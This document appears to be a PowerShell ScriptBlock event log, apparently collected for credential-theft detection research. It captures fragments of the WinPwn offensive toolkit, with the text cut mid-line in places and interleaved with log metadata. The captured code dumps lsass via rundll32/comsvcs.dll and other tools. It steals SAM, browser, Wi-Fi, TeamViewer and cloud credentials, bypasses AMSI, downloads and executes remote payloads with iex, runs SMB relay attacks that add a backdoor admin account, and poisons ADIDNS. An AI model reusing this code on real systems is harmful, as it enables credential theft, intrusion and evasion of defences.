+      10{SharpCloud}
+      11{decryptteamviewer}
+             }
+        }
+        While ($masterquestion -ne 12)
+}
+
+
+function lsassdumps
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Dump lsass for sweet creds
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Use HandleKatz! '
+            Write-Host -ForegroundColor Green '2. Use WerDump! '
+            Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
+            Write-Host -ForegroundColor Green '4. Dump lsass using NanoDump!'
+            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){HandleKatz}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                2{if(isadmin){werDump}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                3{if(isadmin){Dumplsass}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                4{if(isadmin){NanoDumpChoose}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+             }
+        }
+        While ($masterquestion -ne 5)
+
+}
+
+function NanoDumpChoose
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> NanoDump Submenu
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Dump LSASS with a valid signature! '
+            Write-Host -ForegroundColor Green '2. Dump LSASS with an invalid signature, has to be restored afterwards (see NanoDump README)! '
+            Write-Host -ForegroundColor Green '3. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){NanoDump -valid}}
+                2{if(isadmin){NanoDump}}
+            }
+        }
+        While ($masterquestion -ne 3)
+
+}
+
+function NanoDump
+{
+<#
+    .DESCRIPTION
+        Execute NanoDump Shellcode to dump lsass.
+        Main Credits to https://github.com/helpsystems/nanodump
+        Author: Fabian Mosch, Twitter: @ShitSecure
+    #>
+
+Param
+    (
+        [switch]
+        $valid
+)
+
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1')
+
+    if ($valid)
+    {
+        Invoke-NanoDump -valid
+    }
+    else
+    {
+        Invoke-NanoDump
+    }
+}
+
+function werDump
+{
+  <#
+        .DESCRIPTION
+        Dump lsass via wer, credit goes to https://twitter.com/JohnLaTwC/status/1411345380407578624
+        Author: @S3cur3Th1sSh1t
+    #>
+    Write-Host "Dumping to C:\windows\temp\dump.txt"
+    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = 'C:\windows\temp\dump.txt';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()
+    if (test-Path "C:\windows\temp\dump.txt")
+    {
+        Write-Host "Lsass dump success: " $Result
+    }
+
+}
+
+function HandleKatz
+{
+  <#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://github.com/codewhitesec/HandleKatz, @thefLinkk
+        Author: @S3cur3Th1sSh1t
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+      $processes = Get-Process
+      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+      
+      iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
+      
+      Write-Host "Trying to dump the ID: $dumpid"
+      Sleep 2
+
+      Invoke-HandleKatz -handProcID $dumpid
+      
+      Write-Host "The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you can/should use the following: https://github.com/codewhitesec/HandleKatz/blob/main/Decoder.py"
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
+function Decryptteamviewer
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    # Wrote this Script myself, credit goes to @whynotsecurity - https://whynotsecurity.com/blog/teamviewer/
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
+    if(!$consoleoutput){
+        TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
+        Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
+        Start-Sleep 5
+    }
+    else{
+        TeamviewerDecrypt
+    }
+}
+function SharpCloud
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
+    if(!$consoleoutput){
+        Invoke-SharpCloud -Command all >> $currentPath\Exploitation\CloudCreds.txt
+        Get-Content $currentPath\Exploitation\CloudCreds.txt
+        Start-Sleep 5
+    }
+    else{Invoke-SharpCloud -Command all}
+}
+
+function Safedump
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    blocketw
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+    
+	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+	{
+		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+	}
+	else
+	{
+		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/Ghostpack/SafetyKatz.exe
+	}
+}
+    
+function Obfuskittiedump
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/mimi.ps1')
+    Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
+    if(!$consoleoutput){
+        Invoke-TheKatz >> $currentPath\Exploitation\Credentials.txt
+        Get-Content $currentPath\Exploitation\Credentials.txt
+        Start-Sleep -Seconds 5
+    }else{Invoke-TheKatz}
+}
+function Wificreds
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
+    Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
+    if(!$consoleoutput){
+        Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
+        Get-Content $currentPath\Exploitation\WIFI_Keys.txt
+        Start-Sleep -Seconds 5
+    }else{Get-WLAN-Keys}
+}
+    
+function Kittenz
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/obfuskittie.ps1')
+    Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
+    if(!$consoleoutput){
+        inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
+        Get-Content $currentPath\Exploitation\kittenz.txt
+        Start-Sleep -Seconds 5
+    }else{inbox | out-string -Width 5000}
+}
+    
+function Samfile
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
+    Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
+    if(!$consoleoutput){
+        Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
+        Get-Content $currentPath\Exploitation\SAMDump.txt
+        Start-Sleep -Seconds 5
+    }else{Invoke-PowerDump}
+}
+
+function Dumplsass
+{
+  <#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+      try{
+      $processes = Get-Process
+      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+      Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
+      if(!$consoleoutput){
+            Write-Host "Dumpfile goes to .\Exploitation\$env:computername.log "
+          rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.log full
+        }
+        else{
+            Write-Host "Dumpfile goes to C:\windows\temp\$env:computername.log "
+            rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid C:\windows\temp\$env:computername.log full
+        }
+    }
+    catch{
+      Write-Host "Something went wrong, using safetykatz instead"
+                 iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SafetyDump.ps1')
+                 if(!$consoleoutput){
+                    Write-Host -ForegroundColor Yellow 'Dumping lsass to .\Exploitation\debug.bin :'
+                    Safetydump
+                move C:\windows\temp\debug.bin $currentPath\Exploitation\debug.bin
+                }
+                else
+                {
+                    Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
+                    Safetydump
+                }
+      }
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
+function Kernelexploits
+{
+  <#
+        .DESCRIPTION
+        Get a SYSTEM Shell using Kernel exploits. Most binaries are the original poc exploits loaded via Invoke-Refl3ctiv3Pe!njection + obfuscated afterwards for @msi bypass
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Exploitation
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> Get System @S3cur3Th1sSh1t
+
+'@
+        
+    do
+    {
+        Write-Host "================ WinPwn ================"
+      Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
+      Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
+        Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
+        Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
+        Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
+        Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Har
+
+ScriptBlock ID: cfbd832f-4232-4aee-889d-e8ca30b60e75
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\T1555_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/01/2024 10:33:02 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2450
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 2，共 16):
+$argument1 -argument2 $argument2
+                }
+                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
+             
+            }
+
+            	
+    }
+}
+
+function isadmin
+{
+    # Check if Elevated
+    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+    return $isAdmin
+}
+
+function Inveigh {
+  <#
+      .DESCRIPTION
+        Starts Inveigh in a parallel window.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    pathcheck
+    $currentip = Get-currentIP
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
+    
+    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
+    {
+        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
+        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repo/WinPwn/master/WinPwn.ps1'');WinPwn -repo $S3cur3Th1sSh1t_repo;}'
+        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
+        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
+        $Wcl = new-object System.Net.WebClient
+        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-InveighRelay.ps1")
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBClient.ps1")
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBEnum.ps1")
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBExec.ps1")
+
+        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session
+
+        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
+    }
+    
+    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
+    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+    {   
+        if (isadmin)
+        {
+                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+    }
+        else 
+        {
+               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+      }
+    }
+    else
+    {
+        if (isadmin)
+        {
+                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+		
+        }
+        else 
+        {
+               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
+	       
+        }
+    }
+}
+
+
+function adidnsmenu
+{
+
+    pathcheck
+    do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> ADIDNS menu @S3cur3Th1sSh1t
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Add ADIDNS Node! '
+            Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
+            Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
+            Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
+          Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{adidns -add}
+                2{adidns -remove}
+                3{adidns -addwildcard}
+                4{adidns -removewildcard}
+             }
+        }
+        While ($masterquestion -ne 5)
+         
+           
+}
+
+
+
+function adidns
+{
+         param(
+        [switch]
+        $addwildcard,
+        [switch]
+        $removewildcard,
+        [switch]
+        $add,
+        [switch]
+        $remove
+  )
+    pathcheck
+    # Kevin-Robertsons Powermad for Node creation
+    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/PowershellScripts/Powermad.ps1")
+    if ($addwildcard)
+    {
+        $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
+        if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+        {
+            $target = read-host "Please enter the IP-Adress for the wildcard entry"
+          New-ADIDNSNode -Node * -Tombstone -Verbose -data $target
+            Write-Host -ForegroundColor Red 'Be sure to remove the record with `Remove-ADIDNSNode -Node * -Verbose` at the end of your tests'
+        }
+    }
+    if($removewildcard)
+    {
+        Remove-ADIDNSNode -Node *
+    }
+    if($add)
+    {
+       $target = read-host "Please enter the IP-Adress for the ADIDNS entry"
+       $node = read-host "Please enter the Node name"
+     New-ADIDNSNode -Node $node -Tombstone -Verbose -data $target
+    }
+    if($remove)
+    {
+       $node = read-host "Please enter the Node name to be removed"
+     Remove-ADIDNSNode -Node $node
+    }
+
+           
+}
+
+function SessionGopher 
+{
+    <#
+      .DESCRIPTION
+        Starts slightly obfuscated SessionGopher to search for Cached Credentials.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput,
+        [Switch]
+        $allsystems
+  )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/segoph.ps1')
+    $whole_domain = "no"
+    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
+    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
+    {
+            
+          $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
+            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "$currentPath\LocalRecon\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
+            }
+            else 
+            {
+                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain >> $currentPath\LocalRecon\SessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
+            }
+    }
+    else
+    {
+        $session = "no"
+      if(!$noninteractive)
+        {
+            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
+        }
+            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                Invoke-S3ssionGoph3r -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+            }
+            else 
+            {
+                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                Invoke-S3ssionGoph3r >> $currentPath\LocalRecon\SessionGopher.txt
+            }
+    }
+    if ($noninteractive -and $consoleoutput)
+    {
+        if ($allsystems)
+        {
+            Invoke-S3ssionGoph3r -AllDomain
+        }
+        Invoke-S3ssionGoph3r -Thorough
+    }
+}
+
+
+function Kittielocal 
+{
+    <#
+      .DESCRIPTION
+        Dumps Credentials from Memory / Registry / SAM Database / Browsers / Files / DPAPI.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput,
+        [switch]
+        $credentialmanager,
+        [switch]
+        $mimikittie,
+        [switch]
+        $rundll32lsass,
+        [switch]
+        $lazagne,
+        [switch]
+        $browsercredentials,
+        [switch]
+        $mimikittenz,
+        [switch]
+        $wificredentials,
+        [switch]
+        $samdump,
+        [switch]
+        $sharpcloud,
+        [Switch]
+        $teamviewer
+    )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    AmsiBypass
+    if ($noninteractive)
+    {
+        if ($credentialmanager)
+        {
+            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1')
+            Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"
+            if(!$consoleoutput){Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}else{Invoke-WCMDump}
+        }
+        if($mimikittie)
+        {
+            if (isadmin){if(!$consoleoutput){obfuskittiedump -noninteractive}else{obfuskittiedump -noninteractive -consoleoutput}}
+        }
+        if($rundll32lsass)
+        {
+            if(isadmin){if(!$consoleoutput){dumplsass -noninteractive}else{dumplsass -noninteractive -consoleoutput}}
+        }
+        if($lazagne)
+        {
+            if(!$consoleoutput){lazagnemodule -noninteractive}else{lazagnemodule -noninteractive -consoleoutput}
+        }
+        if($browsercredentials)
+        {
+            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+            if(!$consoleoutput){Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}else{Invoke-Sharpweb -command "all"}
+        }
+        if($mimikittenz)
+        {
+            if(!$consoleoutput){kittenz -noninteractive}else{kittenz -noninteractive -consoleoutput}
+        }
+        if($wificredentials)
+        {
+            if(isadmin){if(!$consoleoutput){wificreds}else{wificreds -noninteractive -consoleoutput}}
+        }
+        if ($samdump)
+        {
+            if(isadmin){if(!$consoleoutput){samfile}else{samfile -noninteractive -consoleoutput}}
+        }
+        if ($sharpcloud)
+        {
+            if(!$consoleoutput){SharpCloud}else{SharpCloud -noninteractive -consoleoutput}
+        }
+        if ($teamviewer)
+        {
+            if(!$consoleoutput){decryptteamviewer}else{decryptteamviewer -consoleoutput -noninteractive}
+        } 
+        return
+    }
+      
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Get some credentials
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
+            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
+            Write-Host -ForegroundColor Green '3. Run Safetykatz in me
+
+ScriptBlock ID: cfbd832f-4232-4aee-889d-e8ca30b60e75
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\T1555_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
